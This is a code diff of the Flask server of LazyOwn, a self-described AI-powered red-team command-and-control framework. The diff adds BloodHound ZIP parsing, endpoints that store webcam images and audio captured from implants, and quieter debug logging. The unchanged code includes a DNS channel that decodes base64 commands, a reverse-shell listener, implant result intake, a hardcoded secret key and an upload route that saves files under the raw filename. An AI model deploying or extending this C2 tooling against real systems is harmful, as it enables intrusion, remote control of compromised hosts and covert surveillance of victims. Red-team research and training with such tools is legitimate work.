@@ -15,6 +15,7 @@ import select
 import struct
 import termios
 import logging
+import zipfile
 import requests
 import markdown
 import threading
@@ -53,9 +54,13 @@ from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NA
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
 
+logger = logging.getLogger(__name__)
+config = Config(load_payload())
+if config.enable_c2_debug == True:
+    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+else:
+    logging.basicConfig(level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')
 class Handler(FileSystemEventHandler):
     @staticmethod
     def on_any_event(event):
@@ -79,7 +84,8 @@ class Handler(FileSystemEventHandler):
                     events.sort(key=lambda x: x['timestamp'], reverse=True)
                     events = events[:1000]
         except Exception as e:
-            print(f"Error watchdog: {e}")
+            if config.enable_c2_debug == True:
+                logger.info(f"Error watchdog")
 
 def get_karma_name(elo):
     if elo < 1000:
@@ -105,18 +111,20 @@ def run_shell():
         try:
             shell.cmdloop()
         except Exception as e:
-            print(f"[ERROR] Shell loop crashed: {e}")
+            if config.enable_c2_debug == True:
+                logger.info(f"[ERROR] Shell loop crashed:")
             break
 
 def load_banners():
     """Loads the banners from the JSON file."""
     try:
         with open('sessions/banners.json', 'r') as file:
-            config = json.load(file)
+            config_banner = json.load(file)
     except FileNotFoundError:
-        print("Error: File banners.json not found")
+        if config.enable_c2_debug == True:
+            logger.info("Error: File banners.json not found")
         return
-    return config
+    return config_banner
 
 def load_mitre_data():
     mitre_path = os.path.join("external", ".exploit", "mitre", "enterprise-attack", "enterprise-attack-16.1.json")
@@ -155,8 +163,100 @@ def implants_check():
                         "content": content
                     })
             except Exception as e:
-                print(f"[Error] reading file")
+                if config.enable_c2_debug == True:
+                    logger.info(f"[Error] reading file")
 
+def process_bloodhound_zip(zip_filepath):
+    """
+    Processes a BloodHound ZIP file to extract nodes and edges for graph visualization.
+
+    Args:
+        zip_filepath (str): The path to the BloodHound ZIP file.
+
+    Returns:
+        tuple: (nodes, edges, error_message). Nodes and edges for viz.js, and an error message if any.
+    """
+    nodes_data = {}
+    edges_data = []
+    error_message = None
+
+    try:
+        with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
+            json_files = [name for name in zip_ref.namelist() if name.endswith(".json")]
+            if not json_files:
+                return [], [], "No JSON files found in the ZIP"
+
+            for name in json_files:
+                with zip_ref.open(name) as f:
+                    try:
+                        data = json.load(f)
+                        if config.enable_c2_debug == True:
+                            logger.info(f"Processing file: {name}")
+                        if config.enable_c2_debug == True:
+                            logger.info(f"Data structure: {json.dumps(data, indent=2)[:500]}...")  
+
+                        
+                        items = data.get('data', []) if isinstance(data, dict) else data
+
+                        if not isinstance(items, list):
+                            if config.enable_c2_debug == True:
+                                logger.info(f"Unexpected data structure in {name}: {type(items)}")
+                            continue
+
+                        for item in items:
+                            
+                            if 'ObjectIdentifier' in item and 'Properties' in item:
+                                node_id = item['ObjectIdentifier']
+                                if node_id not in nodes_data:
+                                    properties = item['Properties']
+                                    nodes_data[node_id] = {
+                                        'id': node_id,
+                                        'label': properties.get('name', node_id),
+                                        'title': json.dumps(properties, indent=2),
+                                        'type': name.split('_')[1].replace('.json', '')  
+                                    }
+
+                            
+                            if 'Aces' in item and isinstance(item['Aces'], list):
+                                for ace in item['Aces']:
+                                    if 'PrincipalSID' in ace and 'RightName' in ace:
+                                        edges_data.append({
+                                            'from': item['ObjectIdentifier'],
+                                            'to': ace['PrincipalSID'],
+                                            'label': ace['RightName']
+                                        })
+
+                            
+                            if 'PrimaryGroupSID' in item and item['PrimaryGroupSID']:
+                                edges_data.append({
+                                    'from': item['ObjectIdentifier'],
+                                    'to': item['PrimaryGroupSID'],
+                                    'label': 'MemberOf'
+                                })
+
+                    except json.JSONDecodeError as e:
+                        if config.enable_c2_debug == True:
+                            logger.info(f"Error decoding JSON in {name}: ")
+                        error_message = f"Error decoding JSON in {name}: "
+                    except Exception as e:
+                        if config.enable_c2_debug == True:
+                            logger.info(f"Error processing {name}: ")
+                        error_message = f"Error processing {name}: "
+
+        if not nodes_data and not edges_data:
+            error_message = "No valid nodes or edges extracted from the ZIP"
+
+    except FileNotFoundError:
+        error_message = f"File not found: {zip_filepath}"
+        logger.info(error_message)
+    except zipfile.BadZipFile:
+        error_message = f"Invalid or corrupted ZIP file: {zip_filepath}"
+        logger.info(error_message)
+    except Exception as e:
+        error_message = f"An unexpected error occurred:"
+        logger.info(error_message)
+
+    return list(nodes_data.values()), edges_data, error_message
 
 def start_watching():
     event_handler = Handler()
@@ -236,12 +336,12 @@ def aumentar_elo(user_id, cantidad):
     if usuario:
 
         usuario['elo'] += cantidad
-        print(f"The Elo of user {usuario['username']} Increased in {usuario['elo']}.")
+        logger.info(f"The Elo of user {usuario['username']} Increased in {usuario['elo']}.")
 
         with open(USER_DATA_PATH, 'w') as file:
             json.dump(users, file, indent=4)
     else:
-        print(f"User ID {user_id} not found.")
+        logger.info(f"User ID {user_id} not found.")
 
 def save_note(content):
     file_path = 'sessions/notes.txt'
@@ -574,7 +674,7 @@ def search_database(term, data_path="parquets/techniques.parquet"):
     md_content = ""
     if not results.empty:
         for _, row in results.iterrows():
-            md_content += f"# Result {_ + 1}\n"  # Añade un título para cada resultado
+            md_content += f"# Result {_ + 1}\n"
             for key, value in row.items():
                 md_content += f"- **{key}**: {value}\n"
             md_content += "\n"
@@ -604,13 +704,13 @@ class CustomDNSResolver(BaseResolver):
         qname = str(request.q.qname)
         qtype = request.q.qtype
 
-        # Loggear la consulta entrante
+        
         logger.info(f"Consulta recibida: {qname} (Tipo: {QTYPE[qtype]})")
 
-        # Extraer el subdominio (comando codificado en base64)
+        
         subdomain = qname.replace(".c2.lazyown.org.", "").rstrip('.')
 
-        # Respuestas predefinidas para subdominios específicos
+        
         subdomain_responses = {
             "info.esporalibre.cl.": {
                 QTYPE.A: A("192.168.1.98"),
@@ -639,30 +739,30 @@ class CustomDNSResolver(BaseResolver):
                 QTYPE.TLSA: TLSA(1, 1, 1, b"your_tlsa_data"),
                 QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data")
             },
-            # Configurar respuestas para c2.lazyown.org y sus subdominios
+            
             "c2.lazyown.org.": {
-                QTYPE.A: A("127.0.0.1"),  # IP del servidor DNS
+                QTYPE.A: A("127.0.0.1"),  
                 QTYPE.TXT: TXT("Servidor C2 activo")
             }
         }
 
-        # Verificar si el dominio tiene una respuesta predefinida
+        
         if qname in subdomain_responses:
             if qtype in subdomain_responses[qname]:
                 reply.add_answer(RR(qname, qtype, rdata=subdomain_responses[qname][qtype], ttl=300))
                 logger.info(f"Respuesta predefinida enviada para {qname}")
             else:
-                reply.header.rcode = 3  # NXDOMAIN
+                reply.header.rcode = 3  
                 logger.warning(f"Tipo de consulta no soportado para {qname}: {QTYPE[qtype]}")
         else:
-            # Manejar subdominios de c2.lazyown.org
+            
             if qname.endswith("c2.lazyown.org."):
                 try:
-                    # Decodificar el comando desde el subdominio
+                    
                     command = base64.urlsafe_b64decode(subdomain + "==").decode('utf-8') 
                     logger.info(f"Comando recibido: {command}")
 
-                    # Procesar el comando
+                    
                     if command.startswith("exec:"):
                         output = f"Ejecutado: {command[5:]}"
                         reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(output), ttl=60))
@@ -675,8 +775,8 @@ class CustomDNSResolver(BaseResolver):
                     logger.error(f"Error:")
                     reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Error en el comando"), ttl=60))
             else:
-                # Dominio no reconocido
-                reply.header.rcode = 3  # NXDOMAIN
+                
+                reply.header.rcode = 3  
                 logger.warning(f"Dominio no reconocido: {qname}")
 
         return reply
@@ -692,11 +792,11 @@ def tcp_bridge(local_port, remote_host, remote_port):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', local_port))
     server_socket.listen(5)
-    print(f"[*] Listening for connections on port {local_port}...")
+    logger.info(f"[*] Listening for connections on port {local_port}...")
 
     while True:
         client_socket, addr = server_socket.accept()
-        print(f"[INFO] Accepted connection from {addr}")
+        logger.info(f"[INFO] Accepted connection from {addr}")
 
         threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()
 
@@ -765,7 +865,7 @@ def read_and_forward_pty_output():
                     if output:
                         socketio.emit("pty-output", {"output": output.decode(errors="replace")}, namespace="/pty")
             except Exception as e:
-                logger.error(f"Error leyendo salida: {e}")
+                logger.error(f"Error leyendo salida:")
                 
 def read_and_forward_pty_output_c2():
     max_read_bytes = 1024 * 20
@@ -804,7 +904,7 @@ def get_discovered_hosts():
             if local_ips not in discovered_hosts:
                 discovered_hosts.append(local_ips)
     except FileNotFoundError:
-        print(f"Error: File not found at {hosts_file_path}")
+        logger.info(f"Error: File not found at {hosts_file_path}")
 
     scan_files = glob.glob(os.path.join('sessions', 'scan_discovery*.csv'))
     if scan_files:
@@ -821,9 +921,9 @@ def get_discovered_hosts():
                                 if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
                                     discovered_hosts.append(ip_address)
             except FileNotFoundError:
-                print(f"Error: Scan discovery file not found at {file_path}")
+                logger.info(f"Error: Scan discovery file not found at {file_path}")
             except Exception as e:
-                print(f"Error reading scan discovery file {file_path}: {e}")
+                logger.info(f"Error reading scan discovery file {file_path}")
 
     return discovered_hosts
 
@@ -847,7 +947,7 @@ def get_local_ip_addresses():
             return "No se pudo obtener la IP del servidor desde el sistema operativo."
         return local_ips
     except subprocess.CalledProcessError as e:
-        return f"Error al ejecutar el comando: {e}"
+        return f"Error al ejecutar el comando:"
     except FileNotFoundError:
         return "El comando 'ip' no se encontró en el sistema."
 
@@ -858,7 +958,7 @@ def sanitize_json(data):
     """
     if isinstance(data, dict):
         keys_to_remove = ["c2_user", "c2_pass", "api_key", "telegram_token", "discord_token", "start_user", "start_pass", "rat_key", "email_from", "email_password", "email_username"]
-        for key in list(data.keys()):  # Iterar sobre una copia de las claves para poder eliminarlas
+        for key in list(data.keys()):  
             if key in keys_to_remove or "secret" in key.lower():
                 del data[key]
             elif isinstance(data[key], (dict, list)):
@@ -877,11 +977,17 @@ def add_dynamic_data(data):
 
     return data
 
+SAVE_DIR = "sessions/captured_images"
+if not os.path.exists(SAVE_DIR):
+    os.makedirs(SAVE_DIR)
+
 
 app = Flask(__name__, static_folder='static')
 app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja'
+
+
 app.config['SECRET_KEY'] = app.secret_key
-app.config['SESSION_COOKIE_SECURE'] = True  # Solo enviar cookies sobre HTTPS
+app.config['SESSION_COOKIE_SECURE'] = True  
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['REMEMBER_COOKIE_SECURE'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
@@ -892,6 +998,8 @@ app.jinja_env.filters['markdown'] = markdown_to_html
 BASE_DIR = os.getcwd()
 TOOLS_DIR = f'{BASE_DIR}/tools'
 BASE_DIR += "/sessions/"
+UPLOAD_FOLDER = BASE_DIR + 'uploads'
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 ALLOWED_DIRECTORY = BASE_DIR
 MODEL = retModel()
 shell = LazyOwnShell()
@@ -914,12 +1022,16 @@ login_manager = LoginManager(app)
 login_manager.login_view = 'login'
 USER_DATA_PATH = 'users.json'
 ENV = "PROD"
+DATA_FILE = BASE_DIR + 'surface_attack.json'
+
 with open(f"{path}/sessions/key.aes", 'rb') as f:
     AES_KEY = f.read()
 
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
+
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-config = Config(load_payload())
-UPLOAD_FOLDER = os.path.join(os.getcwd(), 'sessions', 'uploads')
+
 api_key = config.api_key
 route_maleable = config.c2_maleable_route
 win_useragent_maleable = config.user_agent_win
@@ -931,7 +1043,8 @@ DIRECTORY_TO_WATCH = f"{BASE_DIR}"
 client = Groq(api_key=api_key)
 env = Environment(loader=FileSystemLoader('templates'))
 env.filters['markdown'] = markdown_to_html
-print(f"[DEBUG] Clave AES (hex): {AES_KEY.hex()}")
+if config.enable_c2_debug == True:
+    logger.info(f"[DEBUG] Clave AES (hex): {AES_KEY.hex()}")
 implants_check()
 create_report()
 local_ips = get_local_ip_addresses()
@@ -940,10 +1053,12 @@ if len(sys.argv) > 3:
     lport = sys.argv[1]
     USERNAME = sys.argv[2]
     PASSWORD = sys.argv[3]
-    print(f"    [!] Launch C2 at: {local_ips}")
-    print(f"    [!] Launch C2 at: {lport}")
+    if config.enable_c2_debug == True:
+        logger.info(f"    [!] Launch C2 at: {local_ips}")
+        logger.info(f"    [!] Launch C2 at: {lport}")
 else:
-    print("    [!] Need pass the port, user & pass as argument")
+    if config.enable_c2_debug == True:
+        logger.info("    [!] Need pass the port, user & pass as argument")
     sys.exit(2)
 
 if not api_key:
@@ -974,6 +1089,21 @@ def save_users(users):
     with open(USER_DATA_PATH, 'w') as file:
         json.dump(users, file, indent=4)
 
+def load_data():
+    if not os.path.isfile(DATA_FILE):
+        return {}
+    try:
+        with open(DATA_FILE, 'r') as f:
+            raw_data = json.load(f)
+
+            if isinstance(raw_data.get("hosts"), list):
+                raw_data["hosts"] = [h["ip"] if isinstance(h, dict) else str(h) for h in raw_data["hosts"]]
+
+            return raw_data
+    except (json.JSONDecodeError, IOError) as e:
+        app.logger.error(f"Error cargando {DATA_FILE}:")
+        return {}
+
 @login_manager.user_loader
 def load_user(user_id):
     users = load_users()
@@ -996,15 +1126,18 @@ def index():
         return response
     else:
         if current_user.is_authenticated:
-            print(f"Autenticated. Wellcome {client_ip}") 
+            if config.enable_c2_debug == True:
+                logger.info(f"Autenticated. Wellcome {client_ip}") 
         else:
-            print("Unautenticated.")
+            if config.enable_c2_debug == True:
+                logger.info("Unautenticated.")
             return redirect(url_for('login'))
     path = os.getcwd()
     user_agent = request.headers.get('User-Agent')
     host = request.headers.get('Host')
-    print(user_agent)
-    print(host)
+    if config.enable_c2_debug == True:
+        logger.info(user_agent)
+        logger.info(host)
     prompt = getprompt()
     prompt = prompt.replace('\n','<br>')
     sessions_dir = f'{path}/sessions'
@@ -1076,7 +1209,8 @@ def index():
                         result_portscan[client_id] = rows[-1]['result_portscan']
                      
         except Exception as e:
-            print("[Error] implant logs corrupted.")
+            if config.enable_c2_debug == True:
+                logger.info("[Error] implant logs corrupted.")
     
     event_config = load_event_config()
     response_bot = "<p><h3>LazyOwn RedTeam Framework</h3> The <b>First GPL Ai Powered C&C</b> of the <b>World</b></p>"
@@ -1086,7 +1220,7 @@ def index():
             tool_path = os.path.join(TOOLS_DIR, filename)
             with open(tool_path, 'r') as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tool_data['filename'] = filename  
                 tools.append(tool_data)
     
     karma_name = get_karma_name(current_user.elo)
@@ -1155,7 +1289,8 @@ def receive_result(client_id):
         data = json.loads(decrypted_data)
         if client_id not in connected_clients:
             connected_clients.add(client_id)
-            print(f"New client connected: {client_id}")        
+            if config.enable_c2_debug == True:
+                logger.info(f"New client connected: {client_id}")        
         if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user', 'discovered_ips', 'result_portscan']):
             return jsonify({"status": "error", "message": "Invalid data format"}), 400
 
@@ -1192,7 +1327,8 @@ def receive_result(client_id):
                 return jsonify({"status": "error", "message": "Permission denied"}), 403
 
         except Exception as e:
-            print(f"[ERROR] Path validation error: {e}")
+            if config.enable_c2_debug == True:
+                logger.info(f"[ERROR] Path validation error")
             return jsonify({"status": "error", "message": "Path validation error"}), 500
 
         try:
@@ -1234,14 +1370,17 @@ def receive_result(client_id):
             return jsonify({"status": "success", "Platform": client}), 200
 
         except IOError as e:
-            print(f"[ERROR] File operation error: {e}")
+            if config.enable_c2_debug == True:
+                logger.info(f"[ERROR] File operation error")
             return jsonify({"status": "error", "message": "File operation error"}), 500
 
     except json.JSONDecodeError:
-        print(f"[ERROR] Invalid JSON received")
+        if config.enable_c2_debug == True:
+            logger.info(f"[ERROR] Invalid JSON received")
         return jsonify({"status": "error", "message": "Invalid JSON"}), 400
     except Exception as e:
-        print(f"[ERROR] Unexpected error: {e}")
+        if config.enable_c2_debug == True:
+            logger.info(f"[ERROR] Unexpected error")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
 
@@ -1261,7 +1400,7 @@ def issue_command():
 @app.route(f'{route_maleable}/upload', methods=['GET', 'POST'])
 def upload():
     if request.method == 'POST':
-        # Opción 1: Subida normal con formulario HTML
+        
         if 'file' in request.files:
             file = request.files['file']
             if file.filename == '':
@@ -1270,13 +1409,13 @@ def upload():
             file.save(os.path.join(UPLOAD_FOLDER, filename))
             return jsonify({"status": "success", "message": f"File {filename} uploaded"}), 200
 
-        # Opción 2: Datos binarios (por ejemplo, archivo cifrado)
+        
         else:
             encrypted_data = request.get_data()
             if not encrypted_data:
                 return jsonify({"status": "error", "message": "No data received"}), 400
 
-            # Usa un nombre genérico si no hay X-Filename
+            
             filename = secure_filename("archivo_recibido.bin")
 
             decrypted_data = decrypt_data(encrypted_data, True)
@@ -1290,7 +1429,7 @@ def upload():
                 "filename": filename
             }), 200
 
-    # Formulario básico para pruebas
+    
     return '''
     <!doctype html>
     <title>Upload File</title>
@@ -1325,14 +1464,14 @@ from flask import Flask, Response, jsonify
 def serve_file(file_path):
     temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
     
-    # Construir la ruta completa del archivo solicitado
+    
     requested_path = os.path.join(temp_dir, file_path)
     
-    # Normalizar las rutas para evitar intentos de path traversal
+    
     normalized_temp_dir = os.path.normpath(temp_dir)
     normalized_requested_path = os.path.normpath(requested_path)
 
-    # Verificar que la ruta solicitada esté dentro del directorio permitido
+    
     if not normalized_requested_path.startswith(normalized_temp_dir + os.sep):
         return jsonify({"status": "error", "message": "Access denied"}), 403
 
@@ -1396,9 +1535,10 @@ def run_command():
         return jsonify({"error": "No command provided"}), 400
 
     output = shell.one_cmd(command)
-    print(f"[INFO]{output}")
+    if config.enable_c2_debug == True:
+        logger.info(f"[INFO]{output}")
 
-    print(f"[INFO] Type of output: {type(output)}")
+        logger.info(f"[INFO] Type of output: {type(output)}")
 
     if isinstance(output, str):
         serializable_output = output
@@ -1419,8 +1559,8 @@ def run_command():
 def get_output():
     global shell
     output = shell.output
-
-    print(f"[INFO] Type of output: {type(output)}")
+    if config.enable_c2_debug == True:
+        logger.info(f"[INFO] Type of output: {type(output)}")
 
     if isinstance(output, str):
         serializable_output = output
@@ -1489,8 +1629,8 @@ def vuln():
     event_view = data.get('event_view', "")
     
     event_config = load_event_config()
-    
-    print(events)    
+    if config.enable_c2_debug == True:
+        logger.info(events)    
     
     response = {
         "events": events
@@ -1859,7 +1999,7 @@ def edit_event(event_name):
         return "Event not found", 404
 
     if request.method == 'POST':
-        # Actualizar los datos del evento con los datos del formulario
+        
         event.update({
             "name": request.form["title"],
             "src_path": request.form["src_path"],
@@ -1871,7 +2011,7 @@ def edit_event(event_name):
             "operator": request.form["operator"],
             "status": request.form["status"]
         })
-        # Guardar los cambios en el archivo JSON
+        
         with open('event_config.json', 'w') as f:
             json.dump(event_config, f, indent=4)
         return redirect(url_for('get_event_config_view'))
@@ -1903,7 +2043,7 @@ def get_event_config_view():
 
         event_config = load_event_config()
 
-        # Ensure event_config has the correct structure
+        
         if "events" not in event_config:
             event_config["events"] = []
 
@@ -1941,9 +2081,11 @@ def aicmd_view():
 def get_events():
     client_ip = request.remote_addr
     if current_user.is_authenticated:
-        print(f"Autenticated. Wellcome {client_ip}") 
+        if config.enable_c2_debug == True:
+            logger.info(f"Autenticated. Wellcome {client_ip}") 
     else:
-        print("Unautenticated.")
+        if config.enable_c2_debug == True:
+            logger.info("Unautenticated.")
         return redirect(url_for('login'))    
     global events
     event_config = load_event_config()
@@ -2021,7 +2163,7 @@ def view_tool(toolname):
             tool_path_safe = os.path.join(TOOLS_DIR, filename)
             with open(tool_path_safe, 'r') as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tool_data['filename'] = filename  
                 tools.append(tool_data)
 
     valid_tool = None
@@ -2052,7 +2194,7 @@ def update_tool(toolname):
             tool_path_safe = os.path.join(TOOLS_DIR, filename)
             with open(tool_path_safe, 'r') as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tool_data['filename'] = filename  
                 tools.append(tool_data)
 
     valid_tool = None
@@ -2102,7 +2244,7 @@ def delete_tool(toolname):
             tool_path_safe = os.path.join(TOOLS_DIR, filename)
             with open(tool_path_safe, 'r') as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tool_data['filename'] = filename  
                 tools.append(tool_data)
 
     valid_tool = None
@@ -2120,7 +2262,7 @@ def delete_tool(toolname):
     try:
         os.remove(tool_path)
     except OSError as e:
-        return f"Error al eliminar el archivo: {e}", 500
+        return f"Error al eliminar el archivo:", 500
 
     return redirect(url_for('list_tools'))
 
@@ -2351,7 +2493,7 @@ def report():
             tool_path = os.path.join(TOOLS_DIR, filename)
             with open(tool_path, 'r') as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tool_data['filename'] = filename
                 tools.append(tool_data)
     tasks = load_tasks()
     cves = load_cves()
@@ -2377,12 +2519,14 @@ def listener():
 
 @socketio.on('connect', namespace='/listener')
 def handle_connect():
-    print('Client connected to /listener')
+    if config.enable_c2_debug == True:
+        logger.info('Client connected to /listener')
     emit('output', 'Welcome to LazyOwn RedTeam Framework: CRIMEN 👋\r\n$ ')
 
 @socketio.on('disconnect', namespace='/listener')
 def handle_disconnect():
-    print('Client disconnected from /listener')
+    if config.enable_c2_debug == True:
+        logger.info('Client disconnected from /listener')
 
 @socketio.on("pty-input", namespace="/pty")
 def pty_input(data):
@@ -2391,61 +2535,64 @@ def pty_input(data):
         try:
             os.write(app.config["fd"], data["input"].encode())
         except Exception as e:
-            logger.error(f"Error escribiendo entrada: {e}")
+            logger.error(f"Error escribiendo entrada:")
 
 @socketio.on("resize", namespace="/pty")
 def resize(data):
     """Maneja el redimensionamiento de la terminal"""
     if app.config["fd"]:
-        logger.info(f"Redimensionando terminal a {data['rows']}x{data['cols']}")
+        if config.enable_c2_debug == True:
+            logger.info(f"Redimensionando terminal a {data['rows']}x{data['cols']}")
         set_winsize(app.config["fd"], data["rows"], data["cols"])
 
 @socketio.on("connect", namespace="/pty")
 def connect():
     """Maneja nueva conexión de cliente"""
-    logger.info("Nuevo cliente conectado")
+    if config.enable_c2_debug == True:
+        logger.info("Nuevo cliente conectado")
     
     if app.config["child_pid"]:
-        return  # Ya hay una sesión activa
+        return  
 
     try:
-        # Crear proceso hijo con PTY
+        
         (child_pid, fd) = pty.fork()
         
         if child_pid == 0:
-            # Proceso hijo - ejecuta LazyOwnShell
+            
             subprocess.run([
                 "python3", "lazyown.py"
             ], check=True)
         else:
-            # Proceso padre - configuración inicial
+            
             app.config["fd"] = fd
             app.config["child_pid"] = child_pid
             
-            # Tamaño inicial de la terminal
+            
             set_winsize(fd, 80, 140)
             
-            # Iniciar tarea de lectura de salida
+            
             socketio.start_background_task(read_and_forward_pty_output)
-            logger.info(f"Proceso hijo iniciado con PID {child_pid}")
+            if config.enable_c2_debug == True:
+                logger.info(f"Proceso hijo iniciado con PID {child_pid}")
             
     except Exception as e:
-        logger.error(f"Error iniciando shell: {e}")
+        logger.error(f"Error iniciando shell:")
 
 @socketio.on('input')
 def handle_input(data):
     command = data.get('value')
     if not command:
         return
+    if config.enable_c2_debug == True:
+        logger.info(f'[CMD] Received: {command}')
     
-    print(f'[CMD] Received: {command}')
     
-    # Inyectar entrada al shell (simula input())
     shell.stdin.write(command + '\n')
     command_out = shell.one_cmd(command)
     shell.stdin.seek(0)
     
-    # Procesar salida acumulada
+    
     output = shell.stdout.getvalue()
     shell.stdout.truncate(0)
     shell.stdout.seek(0)
@@ -2454,27 +2601,30 @@ def handle_input(data):
 
 @socketio.on('command', namespace='/listener')
 def handle_command(msg):
-    print('Received command: ' + msg)
+    if config.enable_c2_debug == True:
+        logger.info('Received command: ' + msg)
     try:
      
         reverse_shell_socket.sendall((msg + "\n").encode())
     except Exception as e:
         emit('response', {'output': str(e)}, namespace='/listener')
 
-# Ruta nueva
+
 @app.route('/terminal')
 def terminal():
     return render_template('terminal.html')
 
-# WebSocket nuevo espacio: /terminal
+
 @socketio.on('connect', namespace='/terminal')
 def handle_connect():
-    logger.info("Cliente conectado a /terminal")
+    if config.enable_c2_debug == True:
+        logger.info("Cliente conectado a /terminal")
 
 
 @socketio.on('disconnect', namespace='/terminal')
 def handle_disconnect():
-    logger.info("Cliente desconectado de /terminal")
+    if config.enable_c2_debug == True:
+        logger.info("Cliente desconectado de /terminal")
 
 @socketio.on('input', namespace='/terminal')
 def handle_input(data):
@@ -2492,7 +2642,8 @@ def handle_command(data):
     cmd = data.get('cmd')
     if not cmd:
         return
-    print(f"Ejecutando comando: {cmd}")
+    if config.enable_c2_debug == True:
+        logger.info(f"Ejecutando comando: {cmd}")
     output = execute_command(cmd)
     emit('response', {'output': output})
     
@@ -2506,10 +2657,12 @@ def start_reverse_shell():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', reverse_shell_port))
     server_socket.listen(1)
-    print(f"Listening for reverse shell on port {reverse_shell_port}...")
+    if config.enable_c2_debug == True:
+        logger.info(f"Listening for reverse shell on port {reverse_shell_port}...")
 
     reverse_shell_socket, addr = server_socket.accept()
-    print(f"Connection from {addr}")
+    if config.enable_c2_debug == True:
+        logger.info(f"Connection from {addr}")
     while True:
         data = reverse_shell_socket.recv(1024)
         if not data:
@@ -2562,6 +2715,92 @@ def get_config():
     final_payload = add_dynamic_data(sanitized_payload)
 
     return jsonify(final_payload)
+
+@app.route('/capture', methods=['POST'])
+def capture_image():
+    try:
+        
+        data = request.get_json()
+        if not data or 'image' not in data:
+            logging.error("Solicitud sin datos de imagen")
+            return jsonify({"error": "No se proporcionó imagen"}), 400
+
+        
+        image_data = data['image']
+        if image_data.startswith('data:image/png;base64,'):
+            image_data = image_data.split(',')[1]
+        image_bytes = base64.b64decode(image_data)
+
+        
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f"{SAVE_DIR}/capture_{timestamp}.png"
+
+        
+        with open(filename, 'wb') as f:
+            f.write(image_bytes)
+
+        logging.info(f"Imagen guardada: {filename}")
+        return jsonify({"status": "success", "message": "Imagen recibida y guardada"}), 200
+    except Exception as e:
+        logging.error(f"Error procesando imagen: {str(e)}")
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/audio', methods=['POST'])
+def capture_audio():
+    try:
+        if 'audio' not in request.files:
+            logging.error("Solicitud sin datos de audio")
+            return jsonify({"error": "No se proporcionó audio"}), 400
+        audio_file = request.files['audio']
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f"{SAVE_DIR}/audio_{timestamp}.webm"
+        audio_file.save(filename)
+        logging.info(f"Audio guardado: {filename}")
+        return jsonify({"status": "success", "message": "Audio recibido y guardado"}), 200
+    except Exception as e:
+        logging.error(f"Error procesando audio: {str(e)}")
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/surface')
+def surface():
+    return render_template('surface.html')
+
+@app.route('/data')
+def get_data():
+    shell.onecmd('process_scans')
+    data = load_data()
+    if not data:
+        return jsonify({"error": "No se pudo cargar data.json"}), 500
+    return jsonify(data)
+
+@app.route('/upload_zip', methods=['POST'])
+def upload_zip_file():
+    """Handles the file upload, processes the BloodHound ZIP, and prepares data for visualization."""
+    if 'file' not in request.files:
+        return render_template('index.html', error="No file part")
+    file = request.files['file']
+    if file.filename == '':
+        return render_template('index.html', error="No selected file")
+    if file:
+        os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
+        file.save(filepath)
+        nodes, edges, error_message = process_bloodhound_zip(filepath)
+        os.remove(filepath)
+
+        if error_message:
+            if config.enable_c2_debug == True:
+                logger.info(f"Error during processing: {error_message}")
+            return render_template('index.html', error=error_message)
+
+        if not nodes and not edges:
+            return render_template('index.html', error="No valid data extracted from the ZIP")
+        if config.enable_c2_debug == True:
+            logger.info(f"Nodes extracted: {len(nodes)}")
+            logger.info(f"Edges extracted: {len(edges)}")
+        return render_template('surface.html', nodes=nodes, edges=edges)
+    return render_template('index.html', error="Something went wrong")
+    
 
 thread = Thread(target=run_shell)
 thread.daemon = True
